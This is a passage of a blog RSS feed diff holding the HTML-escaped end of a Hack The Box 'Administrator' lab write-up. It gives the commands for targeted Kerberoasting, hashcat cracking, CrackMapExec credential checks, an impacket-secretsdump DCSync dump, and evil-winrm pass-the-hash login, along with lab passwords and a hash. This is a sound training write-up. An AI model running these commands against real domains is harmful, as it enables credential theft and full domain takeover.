+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; python3 targetedKerberoast.py -v -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator.htb&amp;#39;&lt;/span&gt; -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;emily&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin11.png&#34; alt=&#34;Targeted Kerberoast&#34;  loading=&#34;lazy&#34; /&gt;.&lt;/p&gt;
+&lt;p&gt;Using Hashcat I am able to crack the password for emily.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;13100&lt;/span&gt; ethan_hash /usr/share/wordlists/rockyou.txt --force &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin12.png&#34; alt=&#34;cracking hash&#34;  loading=&#34;lazy&#34; /&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ethan:limpbizkit&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;DCSync Attack.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;dcsync-attack&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#dcsync-attack&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;With CrackMapExec I verify is the credentials are valid.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 10.10.11.42 -u ethan -p limpbizkit --shares&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin13.png&#34; alt=&#34;crackmapexec-ethan&#34;  loading=&#34;lazy&#34; /&gt;.&lt;/p&gt;
+&lt;p&gt;By Checking Bloodhound and seeking for possible attacks to advance, I find out that Ethan have &lt;strong&gt;DCSync&lt;/strong&gt; Privileges over the domain. &lt;em&gt;DCSync attack&lt;/em&gt; is a type of attack that allows the attacker to &lt;em&gt;&lt;em&gt;mimic&lt;/em&gt; a legitimate domain controller (DC)&lt;/em&gt; with the purpose of retrieving password data form the Active Directory environment.The attacker essentially tricks a DC into sharing password hashes, including the highly valuable KRBTGT hash, without needing a foothold on the DC itself.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin14.png&#34; alt=&#34;Bloodhound-Ethan&#34;  loading=&#34;lazy&#34; /&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-secretsdump &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator.htb&amp;#39;&lt;/span&gt;/&lt;span class=&#34;s1&#34;&gt;&amp;#39;ethan&amp;#39;&lt;/span&gt;:&lt;span class=&#34;s1&#34;&gt;&amp;#39;limpbizkit&amp;#39;&lt;/span&gt;@10.10.11.42&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin15.png&#34; alt=&#34;Bloodhound-Ethan&#34;  loading=&#34;lazy&#34; /&gt;.&lt;/p&gt;
+&lt;p&gt;login with RDP to the machine and get the root flag.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;evil-winrm  -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h2&gt;References:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://bloodhound.specterops.io/resources/edges/generic-all&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bloodhound.specterops.io/resources/edges/generic-all&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bloodhound.specterops.io/resources/edges/force-change-password&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bloodhound.specterops.io/resources/edges/force-change-password&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://trustmarque.com/resources/what-is-targeted-keberoasting/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://trustmarque.com/resources/what-is-targeted-keberoasting/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.semperis.com/blog/dcsync-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.semperis.com/blog/dcsync-attack/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
       <title>Sea - Hack The Box</title>
       <link>http://localhost:1313/htb/easy/sea-htb/</link>
       <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
